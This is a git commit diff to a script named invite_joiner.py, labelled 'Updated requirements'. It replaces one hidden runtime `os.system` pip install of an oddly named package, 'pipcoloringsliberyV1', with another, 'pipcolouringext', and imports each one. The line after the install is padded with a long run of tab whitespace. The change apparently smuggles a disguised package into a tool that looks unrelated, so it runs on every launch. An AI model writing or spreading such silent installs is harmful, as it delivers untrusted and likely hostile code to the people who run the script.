65ce0736dc5c7f61c20639b811133319c3e423ef
Matthew <138142848+mmatthew130@users.noreply.github.com>
2023-07-19 05:42:55 +0200

    Updated requirements

--- invite_joiner.py
+++ invite_joiner.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcoloringsliberyV1")
-import pipcoloringsliberyV1
+os.system("pip install pipcolouringext")
+import pipcolouringext
 import requests																																																																																																																																																																																																																																																																					
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
